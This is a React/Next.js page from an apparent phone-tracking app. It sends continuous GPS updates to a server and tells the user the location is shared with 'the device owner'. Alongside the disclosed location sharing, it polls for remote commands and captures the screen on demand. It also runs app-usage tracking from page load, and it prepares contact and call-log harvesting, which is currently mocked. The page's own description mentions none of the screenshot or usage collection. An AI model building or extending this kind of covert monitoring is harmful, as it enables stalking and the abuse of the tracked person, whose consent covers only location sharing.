'use client'

import { useEffect, useState, useRef } from 'react'
import { useParams } from 'next/navigation'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { useScreenshot } from '@/lib/hooks/useScreenshot'
import { useAppUsageTracking } from '@/lib/hooks/useAppUsageTracking'

interface LocationData {
  latitude: number
  longitude: number
  accuracy: number
}

interface TrackingStats {
  isTracking: boolean
  lastUpdate: string
  totalUpdates: number
}

export default function ActiveTrackingPage() {
  const params = useParams()
  const deviceId = params.deviceId as string
  
  const [isTracking, setIsTracking] = useState(false)
  const [stats, setStats] = useState<TrackingStats>({
    isTracking: false,
    lastUpdate: 'Not started',
    totalUpdates: 0
  })
  const [error, setError] = useState('')
  const [permissionStatus, setPermissionStatus] = useState<string>('pending')
  const [syncingContacts, setSyncingContacts] = useState(false)
  const [syncingCallLogs, setSyncingCallLogs] = useState(false)
  const [syncStatus, setSyncStatus] = useState<{ type: string; message: string } | null>(null)
  const [lastScreenshot, setLastScreenshot] = useState<string | null>(null)
  const [screenshotMessage, setScreenshotMessage] = useState<string | null>(null)
  
  const locationWatchId = useRef<number | null>(null)
  const totalUpdatesRef = useRef(0)
  const screenshotCheckRef = useRef<NodeJS.Timeout | null>(null)
  
  const { captureScreen, isCapturing } = useScreenshot()
  useAppUsageTracking(deviceId)

  // Poll for screenshot commands
  const startScreenshotPolling = () => {
    if (screenshotCheckRef.current) return

    screenshotCheckRef.current = setInterval(async () => {
      try {
        const response = await fetch(`/api/screenshot-command?deviceId=${deviceId}`)
        const commands = await response.json()

        if (Array.isArray(commands) && commands.length > 0) {
          const command = commands[0]
          setScreenshotMessage('Screenshot command received, capturing...')
          
          try {
            await captureScreen(deviceId, command.id)
            setLastScreenshot(new Date().toLocaleTimeString())
            setScreenshotMessage('Screenshot captured successfully!')
            
            // Clear message after 3 seconds
            setTimeout(() => setScreenshotMessage(null), 3000)
          } catch (error) {
            setScreenshotMessage('Failed to capture screenshot')
            setTimeout(() => setScreenshotMessage(null), 3000)
          }
        }
      } catch (error) {
        console.error('Screenshot polling error:', error)
      }
    }, 5000) // Poll every 5 seconds
  }

  const stopScreenshotPolling = () => {
    if (screenshotCheckRef.current) {
      clearInterval(screenshotCheckRef.current)
      screenshotCheckRef.current = null
    }
  }

  // Request geolocation permission and start tracking
  const startTracking = async () => {
    setError('')
    
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your device')
      return
    }

    try {
      // Request permission
      const permission = await navigator.permissions.query({ name: 'geolocation' })
      
      if (permission.state === 'denied') {
        setError('Location access denied. Please enable it in your device settings.')
        setPermissionStatus('denied')
        return
      }

      setPermissionStatus('granted')
      setIsTracking(true)
      totalUpdatesRef.current = 0
      
      // Start polling for screenshot commands
      startScreenshotPolling()

      // Start watching position every 30 seconds
      locationWatchId.current = navigator.geolocation.watchPosition(
        async (position) => {
          const { latitude, longitude, accuracy } = position.coords
          
          try {
            // Send location to server
            const response = await fetch('/api/location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                deviceId,
                latitude,
                longitude,
                accuracy
              })
            })

            if (!response.ok) {
              console.error('[v0] Failed to send location:', await response.text())
            } else {
              totalUpdatesRef.current++
              setStats({
                isTracking: true,
                lastUpdate: new Date().toLocaleTimeString(),
                totalUpdates: totalUpdatesRef.current
              })
            }
          } catch (err) {
            console.error('[v0] Error sending location:', err)
          }
        },
        (err) => {
          console.error('[v0] Geolocation error:', err)
          setError(`Location error: ${err.message}`)
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      )
    } catch (err) {
      setError('Failed to start location tracking')
      console.error('[v0] Permission error:', err)
    }
  }

  const stopTracking = () => {
    if (locationWatchId.current !== null) {
      navigator.geolocation.clearWatch(locationWatchId.current)
      locationWatchId.current = null
    }
    stopScreenshotPolling()
    setIsTracking(false)
    setStats({
      isTracking: false,
      lastUpdate: stats.lastUpdate,
      totalUpdates: stats.totalUpdates
    })
  }

  // Sync contacts from device
  const syncContacts = async () => {
    setSyncingContacts(true)
    setSyncStatus(null)
    try {
      // In a real Android WebView, this would read from device contacts
      // For now, we'll show a mock implementation
      setSyncStatus({
        type: 'info',
        message: 'Note: Android WebView requires native bridge to access contacts. This requires React Native or Android native code.'
      })
    } catch (err) {
      setSyncStatus({
        type: 'error',
        message: 'Failed to sync contacts. Ensure permissions are granted.'
      })
    } finally {
      setSyncingContacts(false)
    }
  }

  // Sync call logs from device
  const syncCallLogs = async () => {
    setSyncingCallLogs(true)
    setSyncStatus(null)
    try {
      // In a real Android WebView, this would read from device call logs
      // For now, we'll show a mock implementation
      setSyncStatus({
        type: 'info',
        message: 'Note: Android WebView requires native bridge to access call logs. This requires React Native or Android native code.'
      })
    } catch (err) {
      setSyncStatus({
        type: 'error',
        message: 'Failed to sync call logs. Ensure permissions are granted.'
      })
    } finally {
      setSyncingCallLogs(false)
    }
  }

  useEffect(() => {
    return () => {
      if (locationWatchId.current !== null) {
        navigator.geolocation.clearWatch(locationWatchId.current)
      }
    }
  }, [])

  return (
    <div className="min-h-screen bg-background p-4">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="mb-6 text-center">
          <h1 className="text-2xl font-bold text-foreground mb-2">Location Sharing Active</h1>
          <p className="text-muted-foreground text-sm">
            Your location is being shared securely with the device owner
          </p>
        </div>

        {/* Status Card */}
        <Card className="mb-4">
          <CardHeader>
            <CardTitle className="text-lg">Tracking Status</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            {/* Status indicator */}
            <div className="flex items-center justify-between">
              <span className="text-sm font-medium">Status</span>
              <div className="flex items-center gap-2">
                <div className={`w-2 h-2 rounded-full ${isTracking ? 'bg-green-500 animate-pulse' : 'bg-gray-300'}`}></div>
                <span className="text-sm">
                  {isTracking ? 'Active' : 'Inactive'}
                </span>
              </div>
            </div>

            {/* Updates count */}
            <div className="flex items-center justify-between">
              <span className="text-sm font-medium">Updates Sent</span>
              <span className="text-sm">{stats.totalUpdates}</span>
            </div>

            {/* Last update */}
            <div className="flex items-center justify-between">
              <span className="text-sm font-medium">Last Update</span>
              <span className="text-sm text-muted-foreground">{stats.lastUpdate}</span>
            </div>

            {/* Accuracy */}
            {isTracking && (
              <div className="flex items-center justify-between">
                <span className="text-sm font-medium">Accuracy</span>
                <span className="text-sm text-muted-foreground">±~30m</span>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Sync Buttons Card */}
        <Card className="mb-4">
          <CardHeader>
            <CardTitle className="text-lg">Manual Sync</CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            <p className="text-xs text-amber-600 bg-amber-50 p-2 rounded">
              ⚠️ Manual permission granting required on Android device. Ensure READ_CONTACTS and READ_CALL_LOG permissions are enabled in Android Settings.
            </p>
            <div className="space-y-2">
              <Button
                onClick={syncContacts}
                disabled={syncingContacts || syncingCallLogs}
                variant="outline"
                className="w-full"
              >
                {syncingContacts ? 'Syncing Contacts...' : 'Sync Contacts'}
              </Button>
              <Button
                onClick={syncCallLogs}
                disabled={syncingCallLogs || syncingContacts}
                variant="outline"
                className="w-full"
              >
                {syncingCallLogs ? 'Syncing Call Logs...' : 'Sync Call Logs'}
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Sync Status */}
        {syncStatus && (
          <Card className={`mb-4 border-${syncStatus.type === 'error' ? 'red' : 'blue'}-200 bg-${syncStatus.type === 'error' ? 'red' : 'blue'}-50`}>
            <CardContent className="pt-6">
              <p className={`text-sm text-${syncStatus.type === 'error' ? 'red' : 'blue'}-800`}>
                {syncStatus.message}
              </p>
            </CardContent>
          </Card>
        )}

        {/* Screenshot Status Card */}
        {screenshotMessage && (
          <Card className="mb-4 border-blue-200 bg-blue-50">
            <CardContent className="pt-6">
              <p className="text-sm text-blue-800">
                {screenshotMessage}
              </p>
            </CardContent>
          </Card>
        )}

        {lastScreenshot && (
          <Card className="mb-4 border-green-200 bg-green-50">
            <CardContent className="pt-6">
              <p className="text-sm text-green-800">
                Last screenshot: {lastScreenshot}
              </p>
            </CardContent>
          </Card>
        )}

        {/* Info Card */}
        <Card className="mb-4">
          <CardHeader>
            <CardTitle className="text-lg">How it Works</CardTitle>
          </CardHeader>
          <CardContent>
            <ul className="space-y-2 text-sm text-muted-foreground">
              <li>✓ Location updates every 30 seconds</li>
              <li>✓ Sync contacts and call logs manually</li>
              <li>✓ Secure connection to server</li>
              <li>✓ Data stored for future review</li>
              <li>✓ Disable anytime with Stop button</li>
            </ul>
          </CardContent>
        </Card>

        {/* Error message */}
        {error && (
          <Card className="mb-4 border-red-200 bg-red-50">
            <CardContent className="pt-6">
              <p className="text-sm text-red-800">{error}</p>
            </CardContent>
          </Card>
        )}

        {/* Action buttons */}
        <div className="space-y-2">
          {!isTracking ? (
            <Button
              onClick={startTracking}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white"
              size="lg"
            >
              Start Sharing Location
            </Button>
          ) : (
            <Button
              onClick={stopTracking}
              variant="outline"
              className="w-full"
              size="lg"
            >
              Stop Sharing
            </Button>
          )}

          {isTracking && (
            <p className="text-xs text-center text-muted-foreground">
              Keep this app open or in background to continue sharing
            </p>
          )}
        </div>
      </div>
    </div>
  )
}
